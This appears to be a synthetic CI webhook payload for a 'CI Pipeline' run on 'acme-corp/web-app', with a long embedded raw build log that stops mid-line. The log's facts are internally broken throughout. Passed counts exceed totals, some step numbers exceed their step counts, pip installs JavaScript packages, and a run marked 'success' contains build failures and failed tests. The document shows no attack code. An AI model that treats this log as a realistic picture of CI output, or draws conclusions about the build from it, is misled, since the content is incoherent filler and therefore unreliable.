{
  "action": "completed",
  "workflow_run": {
    "id": 166,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "ef543ca3cb0c49c462df2243ad0f6bffdafe7466",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-26T12:46:12.086125Z",
    "updated_at": "2025-11-26T12:49:11.351319Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\npip: Downloading axios-4.16.tar.gz\nOK\npip: Collecting axios\nCompiling src/handler.rs...\nWARNING: eslint has known vulnerabilities\nReady.\n[12:46:12] INFO: Starting build process\n  PASS: unit/test_db_connect.spec.js\npip: Collecting react\nEnvironment: test\nTLS handshake completed\nCompiling src/service.java...\nWARNING: prettier has known vulnerabilities\nAlready up to date.\nInstalling jest@1.19.3\n[12:46:12] DEBUG: Memory usage: 1396MB\nnpm install: resolved 583 packages\n\u2717 build failed with exit code 73\nCoverage: 80% statements, 84% branches\nMinifying vendor.js\npip: Collecting express\nAlready up to date.\nNODE_ENV=development\nBundling vendor.js\nEnvironment: staging\nRan 103 tests in 6s\nCompleted.\npip install: Successfully installed jest-1.11\nArtifact downloaded: 19MB\nSwitched to branch 'feature/task-992'\n[12:46:12] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\n[12:46:12] INFO: Request completed\npip: Downloading express-1.17.tar.gz\nReady.\nCache miss for key-6454\nGenerating source maps...\n[12:46:12] INFO: Processing request\nStep 14/23: Deploying\nArtifact uploaded: dist.zip (7MB)\nStep 4/19: Linting\nPulling image: python:latest\nVerifying...\nCache restored successfully (411MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nCache saved successfully\nUsing Python 3.10\nRan 174 tests in 6s\nCache invalidated: dependencies\npip: Installing build dependencies...\nImage pulled successfully\nCache hit for key-3652\nCoverage: 87% statements, 65% branches\nCompleted.\n\u2713 test completed\nArtifact downloaded: 1MB\nHEAD is now at 1152534\nException: TypeError\npip: Installing build dependencies...\nCache hit for key-1284\nTransforming 631 files...\n[12:46:12] INFO: Cache refreshed\nWaiting...\n\u2713 All checks passed\nPulling image: python:3.11\npip install: Successfully installed eslint-5.14\nSnapshots: 24 passed, 13 total\n[12:46:12] DEBUG: Memory usage: 1268MB\nFinished.\nSnapshots: 17 passed, 4 total\nFinished.\nInstalling eslint@2.5.3\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 885 files...\nUploading artifact 'build' (16 files)\nCache invalidated: dependencies\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\nNODE_ENV=test\nnpm notice: created a lockfile\nCoverage: 86% statements, 94% branches\nFetching submodules...\n\u2713 deploy completed\n\u2713 lint completed\nStep 18/19: Installing dependencies\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\nBundling styles.js\n\u2717 build failed with exit code 59\npip: Collecting lodash\n  PASS: test_cache_hit (57ms)\n[12:46:12] DEBUG: Loading configuration\n\u2713 Task completed in 2876ms\npip: Collecting lodash\nSnapshots: 8 passed, 36 total\nSuccess!\nStep 2/22: Running migrations\nChecking out develop branch\nImage pulled successfully\n[12:46:12] WARN: Deprecated API usage\npip: Installing build dependencies...\npip: Installing build dependencies...\npip: Collecting prettier\npip: Collecting webpack\nTLS handshake completed\nTests: 331 passed, 279 total\nCache invalidated: dependencies\nMinifying vendor.js\nEnvironment: test\nOptimizing 13 modules...\nMinifying main.js\nWARNING: eslint has known vulnerabilities\nTransforming 946 files...\nUsing Python 3.10\nBundling styles.js\npip: Collecting axios\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nNODE_ENV=test\nStep 19/22: Deploying\nGenerating source maps...\n[12:46:12] DEBUG: Initializing service\nSnapshots: 18 passed, 38 total\nHEAD is now at 399d3f3\nCompiling utils/main.py...\nNODE_ENV=production\nAlready up to date.\nCoverage: 73% statements, 61% branches\nLoading...\nWARNING: webpack has known vulnerabilities\n[12:46:12] INFO: Processing request\n[12:46:12] INFO: Starting build process\nStep 4/15: Deploying\nNODE_ENV=development\nMinifying vendor.js\nPulling image: alpine:18\n\u2713 All checks passed\nPOST /api - 202 (91ms)\n[12:46:12] INFO: Cache refreshed\nRan 197 tests in 41s\nPulling image: node:18\n[12:46:12] DEBUG: Query executed in 48ms\nTransforming 485 files...\nFAILED: test_user_create\nStep 18/20: Testing\npip: Downloading react-4.13.tar.gz\nStep 9/20: Installing dependencies\nPOST /api - 202 (229ms)\nUsing Python 3.12\n\u2713 Step 'checkout' succeeded\nnpm notice: created a lockfile\nInstalling lodash@2.17.0\n[12:46:12] DEBUG: Loading configuration\nFinished.\n  PASS: test_user_create (97ms)\n  PASS: unit/test_db_connect.spec.js\nStep 9/22: Installing dependencies\n\u2713 All checks passed\nBundling main.js\nOK\n[12:46:12] INFO: Connecting to database\nWARNING: prettier has known vulnerabilities\nLayer 6/14: COPY command\nRan 117 tests in 26s\nInstalling axios@5.3.3\n[12:46:12] WARN: Deprecated API usage\nMinifying main.js\nFinished.\n  PASS: test_user_create (154ms)\nRan 41 tests in 39s\nReady.\npip: Installing build dependencies...\nMinifying vendor.js\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\nArtifact uploaded: dist.zip (31MB)\nFetching from https://github.com/package.json\nWaiting...\nCompiling lib/service.java...\n[12:46:12] DEBUG: Connection pool: 11 active\nChecking out main branch\nFetching submodules...\nnpm notice: created a lockfile\nSnapshots: 49 passed, 9 total\nArtifact uploaded: dist.zip (31MB)\nConnection established\nPulling image: alpine:latest\n[12:46:12] WARN: Deprecated API usage\nStep 17/22: Running migrations\nCache restored successfully (225MB)\nTime: 117.258s\nCache miss for key-9725\nFetching submodules...\n  PASS: integration/test_cache_hit.spec.js\nAlready up to date.\nImage pulled successfully\nCache invalidated: dependencies\n[12:46:12] DEBUG: Connection pool: 9 active\n\u2713 lint completed\nLayer 2/8: COPY command\n[12:46:12] DEBUG: Memory usage: 776MB\nPOST /upload - 200 (228ms)\nWARNING: react has known vulnerabilities\n[12:46:12] INFO: Cache refreshed\nyarn add: Done in 21.35s\nnpm install: added 15 packages\nLayer 7/9: COPY command\nArtifact uploaded: dist.zip (23MB)\nMinifying vendor.js\nWaiting...\nTest Suites: 26 passed, 42 total\nCache miss for key-7782\nCache invalidated: build\n[12:46:12] DEBUG: Memory usage: 783MB\nTime: 119.57s\nArtifact uploaded: build.tar.gz (7MB)\n[12:46:12] DEBUG: Memory usage: 805MB\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] DEBUG: Loading configuration\nUsing Node.js 14.11.6\nVerifying...\nFetching submodules...\nException: ValueError\nWARNING: express has known vulnerabilities\nCreating production build...\nRan 95 tests in 36s\nFinished.\nReady.\nVerifying...\nBuilding Docker image...\nStep 13/16: Testing\n  PASS: integration/test_db_connect.spec.js\nCache miss for key-9168\nLoading...\nCoverage: 71% statements, 79% branches\nProcessing...\nCoverage: 74% statements, 63% branches\nCache miss for key-3126\nnpm install: resolved 1372 packages\npip: Collecting axios\nUsing Python 3.9\n[12:46:12] WARN: Deprecated API usage\nStep 17/15: Linting\nTime: 9.343s\nTests: 169 passed, 200 total\nGET /health - 201 (18ms)\nStep 13/21: Running migrations\nCompiling lib/service.java...\nUsing Node.js 17.13.0\nStep 9/21: Linting\nPlatform: linux-x64\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nPOST /data - 202 (99ms)\nStep 9/25: Testing\n[12:46:12] DEBUG: Memory usage: 1613MB\nUsing Python 3.9\n  PASS: test_db_connect (471ms)\nFAILED: test_auth_login\n[12:46:12] WARN: Deprecated API usage\n=== Step type_check completed ===\n=== Step: save_cache ===\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\n[12:46:12] WARN: Deprecated API usage\nUsing Node.js 15.2.0\n  PASS: test_api_health (286ms)\nCache saved successfully\nStep 15/17: Running migrations\nCache invalidated: dependencies\nWARNING: prettier has known vulnerabilities\nStep 17/23: Linting\nStep 2/22: Building\nPlatform: darwin-arm64\nException: TypeError\nWARNING: react has known vulnerabilities\nCompiling src/utils.go...\npip: Collecting eslint\n  PASS: integration/test_user_create.spec.js\n  PASS: integration/test_user_create.spec.js\npip install: Successfully installed react-4.5\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 379 passed, 64 total\n[12:46:12] INFO: Starting build process\nCache saved successfully\nProcessing...\nArtifact downloaded: 31MB\nTests: 296 passed, 99 total\n[12:46:12] DEBUG: Loading configuration\nCache invalidated: build\nStep 18/21: Testing\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] DEBUG: Query executed in 83ms\n\u2713 lint completed\nnpm install: resolved 1279 packages\nFetching from https://gcr.io/package.json\nPushing to registry...\nNODE_ENV=development\nCoverage: 85% statements, 69% branches\nTLS handshake completed\nCache hit for key-6805\nUsing Python 3.11\nPushing to registry...\nFinished.\nGenerating source maps...\nEnvironment: test\n[12:46:12] DEBUG: Memory usage: 1782MB\npip: Installing build dependencies...\nPulling image: alpine:3.11\nSwitched to branch 'bugfix/task-347'\nChecking out develop branch\nMinifying main.js\n\u2713 Step 'install' succeeded\n[12:46:12] DEBUG: Initializing service\n[12:46:12] WARN: Deprecated API usage\nEnvironment: test\n\u2713 Task completed in 4633ms\nUsing Node.js 17.15.9\npip: Collecting react\n\u2713 All checks passed\nStep 12/16: Installing dependencies\nPOST /api - 202 (231ms)\nMinifying vendor.js\nCache hit for key-9798\nWARNING: eslint has known vulnerabilities\nCache restored successfully (211MB)\n[12:46:12] INFO: Cache refreshed\nPlatform: linux-x64\nGET /status - 201 (64ms)\nnpm install: added 450 packages\n  PASS: e2e/test_db_connect.spec.js\nnpm install: added 55 packages\nCompiling src/app.ts...\nMinifying vendor.js\n[12:46:12] WARN: Deprecated API usage\nTest Suites: 22 passed, 29 total\nHEAD is now at 22332fe\n[12:46:12] DEBUG: Initializing service\nPOST /data - 200 (150ms)\n[12:46:12] INFO: Starting build process\nGenerating source maps...\nCreating production build...\npip: Downloading axios-1.1.tar.gz\nStep 1/25: Running migrations\nStep 15/25: Building\nFinished.\nArtifact uploaded: dist.zip (95MB)\nCache saved successfully\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nHEAD is now at 2ebe2c0\nArtifact uploaded: dist.zip (76MB)\npip: Installing build dependencies...\nnpm notice: created a lockfile\npip: Installing build dependencies...\nPOST /api - 200 (285ms)\nMinifying app.js\nImage pulled successfully\nWARNING: express has known vulnerabilities\n[12:46:12] INFO: Processing request\nStep 20/24: Linting\n\u2713 lint completed\nTests: 256 passed, 145 total\nGET /health - 201 (68ms)\nFinished.\nPulling image: alpine:18\nUsing Python 3.11\nSnapshots: 1 passed, 9 total\nPlatform: win32-x64\n[12:46:12] ERROR: Connection failed\npip: Downloading eslint-5.14.tar.gz\nEnvironment: test\n\u2713 Step 'checkout' succeeded\n[12:46:12] INFO: Cache refreshed\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] INFO: Starting build process\nWARNING: lodash has known vulnerabilities\nStep 8/25: Running migrations\nyarn add: Done in 5.27s\nnpm install: resolved 673 packages\npip: Downloading webpack-4.19.tar.gz\nStep 18/23: Deploying\nCompiling components/main.py...\nNODE_ENV=development\nTransforming 473 files...\nWaiting...\n[12:46:12] DEBUG: Initializing service\nTransforming 253 files...\npip: Installing build dependencies...\nPulling image: python:latest\nImage pulled successfully\nStep 18/21: Deploying\nReady.\nPushing to registry...\nStep 2/24: Testing\n\u2713 deploy completed\n[12:46:12] DEBUG: Memory usage: 1233MB\npip: Installing build dependencies...\nInstalling jest@3.15.8\npip: Installing build dependencies...\n\u2713 Task completed in 4980ms\n[12:46:12] DEBUG: Query executed in 2ms\nPOST /upload - 200 (415ms)\nOptimizing 37 modules...\nException: RuntimeError\nStep 16/21: Running migrations\nSnapshots: 36 passed, 11 total\nPlatform: darwin-arm64\nHEAD is now at 620a061\nFinished.\n[12:46:12] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nBuilding Docker image...\n[12:46:12] INFO: Processing request\nTest Suites: 43 passed, 36 total\nSnapshots: 38 passed, 19 total\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/handler.rs...\n[12:46:12] DEBUG: Query executed in 88ms\nWARNING: react has known vulnerabilities\nHEAD is now at dbf3900\n  PASS: integration/test_api_health.spec.js\nEnvironment: staging\nDone.\n  PASS: test_db_connect (103ms)\nBuilding Docker image...\npip: Downloading eslint-3.18.tar.gz\nArtifact uploaded: dist.zip (47MB)\npip: Collecting react\nCreating production build...\nPlatform: win32-x64\n[12:46:12] DEBUG: Loading configuration\nFetching from https://pypi.org/package.json\nCache hit for key-8693\nHEAD is now at fe88d82\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nWARNING: axios has known vulnerabilities\nVerifying...\nSnapshots: 43 passed, 37 total\nCompiling utils/handler.rs...\nOK\nCache hit for key-6214\nEnvironment: production\nVerifying...\nCoverage: 77% statements, 65% branches\nFAILED: test_api_health\nnpm notice: created a lockfile\n[12:46:12] DEBUG: Loading configuration\nLoading...\nHEAD is now at 1b57de1\nCache hit for key-3434\nArtifact downloaded: 40MB\n[12:46:12] INFO: Starting build process\nException: NullPointerException\nCompleted.\nFetching from https://registry.npmjs.org/package.json\nFinished.\nLoading...\nUsing Python 3.9\nGenerating source maps...\nHEAD is now at 2a4d840\npip: Collecting axios\n[12:46:12] WARN: Deprecated API usage\nFetching submodules...\n\u2713 All checks passed\n[12:46:12] ERROR: Connection failed\nStep 2/20: Deploying\nInstalling express@3.8.5\n\u2713 Step 'checkout' succeeded\nStep 2/23: Installing dependencies\n[12:46:12] INFO: Request completed\nBundling main.js\nCoverage: 73% statements, 92% branches\nTests: 253 passed, 464 total\nPlatform: win32-x64\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_user_create.spec.js\nCompiling utils/handler.rs...\nCompiling utils/app.ts...\nSwitched to branch 'bugfix/task-878'\nEnvironment: production\nEnvironment: development\nLayer 2/11: ENV command\nCache hit for key-2485\nBuilding Docker image...\n[12:46:12] DEBUG: Connection pool: 15 active\nTLS handshake completed\nWARNING: express has known vulnerabilities\nCache miss for key-3485\nCache miss for key-3102\nFetching from https://registry.npmjs.org/package.json\n[12:46:12] DEBUG: Initializing service\n[12:46:12] DEBUG: Memory usage: 1753MB\n[12:46:12] WARN: Deprecated API usage\nStep 19/20: Testing\nImage pulled successfully\n  PASS: test_auth_login (36ms)\nSuccess!\n  PASS: test_auth_login (123ms)\nUsing Python 3.10\nInstalling eslint@4.4.7\nInstalling express@2.17.9\nSuccess!\nHEAD is now at fa1a1da\nPulling image: python:3.11\nStep 16/18: Running migrations\nCompleted.\nAlready up to date.\nCoverage: 82% statements, 71% branches\nLoading...\nHEAD is now at 9e3719b\nSwitched to branch 'bugfix/task-514'\nGET /api - 201 (28ms)\nGenerating source maps...\nTests: 353 passed, 406 total\nStep 13/22: Running migrations\nCreating production build...\nnpm install: resolved 1662 packages\n[12:46:12] INFO: Cache refreshed\n  PASS: test_api_health (6ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nArtifact downloaded: 28MB\n  PASS: integration/test_cache_hit.spec.js\nBundling vendor.css\n[12:46:12] DEBUG: Loading configuration\nTransforming 218 files...\nUploading artifact 'coverage' (46 files)\nWARNING: axios has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nBundling main.css\npip install: Successfully installed eslint-2.9\n[12:46:12] INFO: Processing request\n[12:46:12] INFO: Connecting to database\nTest Suites: 37 passed, 9 total\nWaiting...\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 675 packages\nLayer 6/12: ENV command\npip: Downloading eslint-1.17.tar.gz\n[12:46:12] DEBUG: Memory usage: 754MB\n\u2713 test completed\nBundling runtime.js\n[12:46:12] WARN: Deprecated API usage\nCache restored successfully (349MB)\n[12:46:12] INFO: Processing request\nException: ValueError\n[12:46:12] INFO: Starting build process\nFAILED: test_auth_login\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\nGenerating source maps...\nMinifying app.js\nCompiling lib/service.java...\n  PASS: test_db_connect (244ms)\n[12:46:12] INFO: Request completed\n\u2713 test completed\nUsing Python 3.11\nStep 1/21: Building\nFetching submodules...\nAlready up to date.\nCache invalidated: dependencies\nProcessing...\nnpm install: added 497 packages\nEnvironment: test\nFAILED: test_user_create\nUploading artifact 'dist' (20 files)\nLayer 3/13: COPY command\nBuilding Docker image...\nCache invalidated: build\npip: Collecting axios\nChecking out master branch\nStep 5/21: Running migrations\nEnvironment: production\nnpm notice: created a lockfile\nSuccess!\nTLS handshake completed\n[12:46:12] INFO: Cache refreshed\npip: Installing build dependencies...\nBundling vendor.js\nnpm notice: created a lockfile\nHEAD is now at cde88eb\nyarn add: Done in 1.18s\nnpm notice: created a lockfile\nProcessing...\nGET /api - 201 (65ms)\nWARNING: axios has known vulnerabilities\nStep 14/25: Installing dependencies\nCompiling components/main.py...\nSnapshots: 31 passed, 1 total\nChecking out master branch\nException: RuntimeError\nCompleted.\nCache saved successfully\nMinifying main.js\nGET /health - 204 (39ms)\nOptimizing 33 modules...\nTests: 59 passed, 299 total\nnpm install: added 484 packages\n  PASS: test_auth_login (86ms)\n[12:46:12] WARN: Deprecated API usage\nDone.\n[12:46:12] INFO: Cache refreshed\nOptimizing 68 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\nVerifying...\n[12:46:12] DEBUG: Loading configuration\n[12:46:12] INFO: Connecting to database\nGenerating source maps...\nException: ValueError\nTests: 281 passed, 439 total\n\u2713 All checks passed\nConnection established\n[12:46:12] DEBUG: Loading configuration\nCache hit for key-8720\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling main.js\nCoverage: 98% statements, 73% branches\n\u2713 All checks passed\nProcessing...\nPOST /data - 202 (213ms)\nCache restored successfully (150MB)\nCompiling utils/main.py...\nStep 11/24: Testing\n[12:46:12] ERROR: Connection failed\nChecking out master branch\nTest Suites: 31 passed, 42 total\nStep 15/19: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nProcessing...\nSuccess!\n[12:46:12] DEBUG: Query executed in 23ms\nTests: 485 passed, 218 total\nReady.\nCache miss for key-8074\nHEAD is now at 686fcb3\n[12:46:12] INFO: Request completed\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: dist.zip (20MB)\nFetching submodules...\nDone.\nStep 17/16: Building\n[12:46:12] WARN: Deprecated API usage\nTests: 256 passed, 293 total\npip: Installing build dependencies...\nProcessing...\n[12:46:12] DEBUG: Query executed in 76ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2996\npip: Collecting webpack\nLoading...\nnpm install: added 158 packages\nLoading...\npip: Collecting lodash\nMinifying app.js\nGET /api - 200 (79ms)\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed webpack-2.19\nPushing to registry...\nCompiling components/index.js...\nWARNING: webpack has known vulnerabilities\nAlready up to date.\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 202 (179ms)\n[12:46:12] DEBUG: Initializing service\nArtifact downloaded: 23MB\nOK\nCache restored successfully (129MB)\nArtifact downloaded: 17MB\nFetching submodules...\nNODE_ENV=test\nFetching from https://pypi.org/package.json\nChecking out develop branch\nWaiting...\nTests: 330 passed, 398 total\n\u2713 Step 'build' succeeded\nPlatform: linux-x64\nUploading artifact 'coverage' (33 files)\npip: Collecting jest\npip install: Successfully installed react-3.10\nnpm notice: created a lockfile\nCache invalidated: build\nGenerating source maps...\n[12:46:12] INFO: Starting build process\nCache restored successfully (426MB)\nCompiling components/main.py...\n\u2713 Step 'setup' succeeded\nCoverage: 77% statements, 69% branches\n=== Step setup_environment completed ===\n=== Step: install_dependencies ===\n\u2713 Task completed in 194ms\nMinifying main.js\n[12:46:12] INFO: Request completed\nTransforming 612 files...\n[12:46:12] INFO: Request completed\nRan 189 tests in 18s\nyarn add: Done in 21.32s\nSuccess!\nOK\npip install: Successfully installed prettier-5.16\nMinifying app.js\nWARNING: prettier has known vulnerabilities\nStep 9/15: Running migrations\n[12:46:12] INFO: Cache refreshed\n[12:46:12] WARN: Deprecated API usage\nStep 17/20: Deploying\nHEAD is now at 926ba7a\nDone.\n[12:46:12] DEBUG: Initializing service\nTLS handshake completed\nFetching from https://amazonaws.com/package.json\nFetching submodules...\nConnection established\nnpm install: resolved 1172 packages\nRan 155 tests in 1s\nPOST /upload - 201 (218ms)\npip: Downloading webpack-3.11.tar.gz\nnpm install: resolved 1035 packages\n[12:46:12] DEBUG: Initializing service\nReady.\n\u2713 Task completed in 3737ms\nMinifying app.js\nRan 188 tests in 29s\nOptimizing 84 modules...\nNODE_ENV=development\n[12:46:12] WARN: Deprecated API usage\nnpm notice: created a lockfile\n[12:46:12] DEBUG: Loading configuration\nTransforming 989 files...\nConnection established\nStep 5/20: Deploying\n  PASS: test_db_connect (477ms)\nArtifact downloaded: 15MB\nFetching from https://registry.npmjs.org/package.json\nEnvironment: development\nTransforming 212 files...\n  PASS: test_cache_hit (236ms)\nDone.\nSwitched to branch 'bugfix/task-298'\nEnvironment: test\nOptimizing 71 modules...\nStep 11/21: Installing dependencies\n[12:46:12] DEBUG: Query executed in 55ms\nCompiling src/app.ts...\nPlatform: linux-x64\nStep 18/21: Linting\nLayer 5/9: RUN command\nWaiting...\nCache hit for key-4218\nHEAD is now at 6067b4d\nUploading artifact 'build' (12 files)\nFetching from https://github.com/package.json\nStep 11/21: Running migrations\nFetching submodules...\nPOST /api - 201 (266ms)\nStep 1/20: Testing\n  PASS: test_db_connect (487ms)\nyarn add: Done in 22.28s\nnpm install: resolved 1036 packages\npip: Collecting express\nCache saved successfully\n[12:46:12] DEBUG: Initializing service\n[12:46:12] WARN: Deprecated API usage\nBuilding Docker image...\nCache invalidated: node_modules\nStep 3/23: Installing dependencies\n  PASS: test_user_create (286ms)\n[12:46:12] DEBUG: Memory usage: 215MB\nnpm notice: package.json updated\nStep 19/21: Building\nDone.\nnpm install: resolved 399 packages\nCache restored successfully (394MB)\nCache saved successfully\nOK\n[12:46:12] WARN: Deprecated API usage\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\n[12:46:12] DEBUG: Query executed in 31ms\n  PASS: e2e/test_auth_login.spec.js\nnpm notice: created a lockfile\nCoverage: 76% statements, 65% branches\nTransforming 365 files...\npip install: Successfully installed lodash-4.6\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: staging\nInstalling express@4.4.10\nReady.\nHEAD is now at 4579c75\n[12:46:12] INFO: Starting build process\n[12:46:12] DEBUG: Connection pool: 13 active\n\u2713 package completed\nLoading...\n[12:46:12] DEBUG: Memory usage: 1603MB\n[12:46:12] INFO: Starting build process\nCache miss for key-4399\n[12:46:12] WARN: Deprecated API usage\nCompleted.\n\u2713 Task completed in 1958ms\nCache saved successfully\nnpm notice: created a lockfile\nCache hit for key-3690\nBundling styles.css\nEnvironment: production\n[12:46:12] INFO: Request completed\n  PASS: integration/test_auth_login.spec.js\nPlatform: win32-x64\nLayer 9/11: ENV command\nImage pulled successfully\nNODE_ENV=test\n[12:46:12] ERROR: Connection failed\nSuccess!\n[12:46:12] INFO: Connecting to database\nLayer 7/8: ENV command\nHEAD is now at 343f3e5\npip: Installing build dependencies...\nReady.\npip: Downloading lodash-5.17.tar.gz\n\u2713 Step 'install' succeeded\nMinifying main.js\nRan 106 tests in 39s\n\u2713 All checks passed\n[12:46:12] WARN: Deprecated API usage\nCompiling utils/index.js...\n[12:46:12] ERROR: Connection failed\nGET /status - 201 (61ms)\nException: RuntimeError\nUsing Node.js 16.14.2\n\u2713 Step 'checkout' succeeded\nStep 19/21: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nCompiling lib/main.py...\nOK\nWaiting...\nGET /api - 200 (96ms)\nOptimizing 93 modules...\nGET /status - 200 (2ms)\n[12:46:12] DEBUG: Loading configuration\nSwitched to branch 'feature/task-146'\nProcessing...\n[12:46:12] WARN: Deprecated API usage\nRan 160 tests in 33s\n[12:46:12] INFO: Starting build process\npip: Collecting webpack\n\u2713 package completed\nyarn add: Done in 19.53s\nInstalling express@5.20.5\nFetching from https://github.com/package.json\nStep 16/15: Building\nCompiling src/index.js...\n  PASS: integration/test_user_create.spec.js\n[12:46:12] DEBUG: Connection pool: 14 active\n[12:46:12] DEBUG: Connection pool: 20 active\nWARNING: prettier has known vulnerabilities\nSuccess!\nMinifying main.js\nHEAD is now at 47206e4\n[12:46:12] INFO: Connecting to database\nTLS handshake completed\nCompiling utils/utils.go...\nInstalling axios@3.11.4\nException: ValueError\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nLayer 7/11: RUN command\nLayer 2/14: COPY command\nnpm install: resolved 907 packages\n  PASS: unit/test_auth_login.spec.js\n  PASS: test_api_health (417ms)\nUploading artifact 'coverage' (36 files)\nnpm notice: created a lockfile\nReady.\nNODE_ENV=development\nFetching from https://googleapis.com/package.json\nReady.\nFetching submodules...\nnpm notice: package.json updated\nStep 10/23: Testing\nTLS handshake completed\nCache invalidated: build\n[12:46:12] DEBUG: Loading configuration\npip: Downloading jest-1.14.tar.gz\n[12:46:12] DEBUG: Query executed in 2ms\nTransforming 602 files...\nLayer 9/9: COPY command\nCache saved successfully\nnpm install: added 59 packages\nLoading...\nLayer 7/15: ENV command\nImage pulled successfully\n\u2713 Task completed in 2215ms\nStep 5/25: Linting\nOK\nWARNING: prettier has known vulnerabilities\n\u2713 validate completed\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nStep 11/16: Deploying\npip: Installing build dependencies...\n[12:46:12] INFO: Cache refreshed\n[12:46:12] WARN: Deprecated API usage\nCompiling lib/utils.go...\nCompleted.\nWaiting...\nCompiling utils/handler.rs...\nPulling image: alpine:latest\nSuccess!\nSnapshots: 41 passed, 33 total\nUsing Python 3.11\nChecking out master branch\nOptimizing 74 modules...\nLoading...\n[12:46:12] INFO: Request completed\nEnvironment: staging\npip: Collecting express\n[12:46:12] INFO: Starting build process\nInstalling express@3.14.3\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:12] DEBUG: Query executed in 4ms\nArtifact uploaded: dist.zip (27MB)\n[12:46:12] INFO: Connecting to database\nTransforming 955 files...\nArtifact uploaded: build.tar.gz (47MB)\nUsing Node.js 16.20.7\nnpm notice: created a lockfile\nBundling main.css\nStep 15/20: Testing\nCache saved successfully\nTime: 113.168s\nPlatform: linux-x64\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/utils.go...\nStep 9/19: Building\n[12:46:12] INFO: Connecting to database\nCoverage: 85% statements, 84% branches\nCreating production build...\nCompiling src/main.py...\nCoverage: 91% statements, 76% branches\n[12:46:12] DEBUG: Memory usage: 1452MB\nArtifact uploaded: build.tar.gz (7MB)\nCache invalidated: node_modules\nStep 16/16: Testing\n[12:46:12] DEBUG: Initializing service\nOK\nUsing Node.js 20.4.7\nException: TypeError\nEnvironment: development\nHEAD is now at 6dc7eb5\n=== Step deploy_production completed ===\n=== Step: setup_node ===\nCache hit for key-3087\nReady.\nCreating production build...\nCompleted.\n\u2713 Task completed in 2467ms\nSuccess!\nFinished.\nException: NullPointerException\nStep 15/21: Testing\nInstalling react@3.19.7\nCreating production build...\nFetching submodules...\nUploading artifact 'dist' (18 files)\nStep 20/25: Running migrations\n[12:46:12] DEBUG: Initializing service\nFinished.\n[12:46:12] DEBUG: Initializing service\n  PASS: test_user_create (159ms)\nInstalling webpack@3.13.0\n[12:46:12] DEBUG: Memory usage: 837MB\n\u2713 Task completed in 3638ms\nWARNING: axios has known vulnerabilities\nTime: 55.225s\nCoverage: 81% statements, 82% branches\nVerifying...\nUsing Node.js 15.13.2\n[12:46:12] WARN: Deprecated API usage\nTLS handshake completed\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] INFO: Starting build process\nConnection established\nArtifact uploaded: dist.zip (51MB)\nRan 147 tests in 58s\n[12:46:12] DEBUG: Connection pool: 4 active\nnpm install: resolved 329 packages\npip: Installing build dependencies...\n\u2713 All checks passed\nLayer 2/14: RUN command\nTLS handshake completed\nStep 19/20: Testing\nEnvironment: development\nNODE_ENV=production\n[12:46:12] INFO: Connecting to database\nStep 12/20: Running migrations\nLayer 2/10: RUN command\nPushing to registry...\n\u2713 Step 'build' succeeded\nOK\nFetching submodules...\n\u2713 All checks passed\nWARNING: eslint has known vulnerabilities\nOptimizing 29 modules...\nAlready up to date.\nFAILED: test_user_create\nPushing to registry...\n\u2713 Task completed in 1465ms\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: unit/test_user_create.spec.js\nReady.\nStep 7/21: Installing dependencies\nPlatform: darwin-arm64\nCompiling src/handler.rs...\nStep 19/19: Testing\nPushing to registry...\n[12:46:12] DEBUG: Initializing service\nCache invalidated: build\nUploading artifact 'coverage' (26 files)\nException: RuntimeError\nUploading artifact 'coverage' (8 files)\n  PASS: test_cache_hit (200ms)\nStep 9/25: Installing dependencies\nSwitched to branch 'feature/task-998'\nHEAD is now at 9cd3b4a\nBuilding Docker image...\nHEAD is now at 1fb32b2\nWARNING: prettier has known vulnerabilities\nFetching from 